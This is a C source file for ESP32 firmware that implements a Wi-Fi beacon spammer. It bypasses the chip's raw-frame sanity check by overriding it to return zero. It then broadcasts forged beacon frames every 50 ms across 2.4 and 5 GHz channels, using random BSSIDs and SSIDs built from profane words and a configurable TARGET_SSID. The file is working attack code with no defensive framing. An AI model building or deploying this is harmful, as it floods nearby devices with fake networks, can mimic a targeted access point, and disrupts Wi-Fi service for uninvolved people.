#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_random.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "config.h"

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

#define TAG "Beacon_Spammer"

static const char* beacon_name[] = {
    "sh1t","fuckyou",TARGET_SSID,"LLL","ERROR","exception","b1tch","d1ck"
};

static const uint8_t beacon_header[36] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,
    0xE8, 0x03,
    0x21, 0x00
};

static const uint8_t beacon_tail[39] = {
    0x01, 0x08,
    0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    0x03, 0x01,
    0x01,
    0x30, 0x18,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00,
    0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00
};

static const char charset[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static const uint8_t channels[] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13,14,
    36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165
};
#define CHAN_COUNT (sizeof(channels) / sizeof(channels[0]))

void beacon_spam_task(void *arg) {
    ESP_LOGI(TAG, "Starting beacon spammer");

    uint8_t packet[128];
    uint8_t bssid[MAC_LEN];
    uint8_t rand_buf[16];
    int name_count = sizeof(beacon_name) / sizeof(beacon_name[0]);
    int chan_idx = 0;

    while (1) {
        memcpy(packet, beacon_header, sizeof(beacon_header));

        esp_fill_random(bssid, MAC_LEN);
        memcpy(packet + 10, bssid, MAC_LEN);
        memcpy(packet + 16, bssid, MAC_LEN);

        packet[36] = 0x00;

        char *ssid = (char *)(packet + 38);
        const char *prefix = beacon_name[esp_random() % name_count];
        size_t prefix_len = strlen(prefix);
        if (prefix_len > SSID_MAX_LEN) prefix_len = SSID_MAX_LEN;
        memcpy(ssid, prefix, prefix_len);

        size_t max_suffix = SSID_MAX_LEN - prefix_len - 1;
        if (max_suffix > 15) max_suffix = 15;

        if (max_suffix > 0) {
            ssid[prefix_len] = '-';
            esp_fill_random(rand_buf, max_suffix);
            for (size_t i = 0; i < max_suffix; i++)
                ssid[prefix_len + 1 + i] = charset[rand_buf[i] & 63];
        }

        size_t ssid_len = prefix_len + (max_suffix > 0 ? 1 + max_suffix : 0);
        packet[37] = ssid_len;

        size_t tail_offset = 38 + ssid_len;
        memcpy(packet + tail_offset, beacon_tail, sizeof(beacon_tail));

        chan_idx = (chan_idx + 1) % CHAN_COUNT;
        packet[tail_offset + 12] = channels[chan_idx];
        esp_wifi_set_channel(channels[chan_idx], WIFI_SECOND_CHAN_NONE);

        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, packet, tail_offset + sizeof(beacon_tail), 0);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "Beacon tx failed: %s", esp_err_to_name(ret));
        }

        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

static TaskHandle_t beacon_task_handle = NULL;

void start_beacon_spam_task() {
    if(beacon_task_handle == NULL) {
        xTaskCreate(&beacon_spam_task, "beacon_spam_task", 4096, NULL, 3, &beacon_task_handle);
    }
}

void stop_beacon_spam_task() {
    if(beacon_task_handle != NULL) {
        vTaskDelete(beacon_task_handle);
        beacon_task_handle = NULL;
    }
}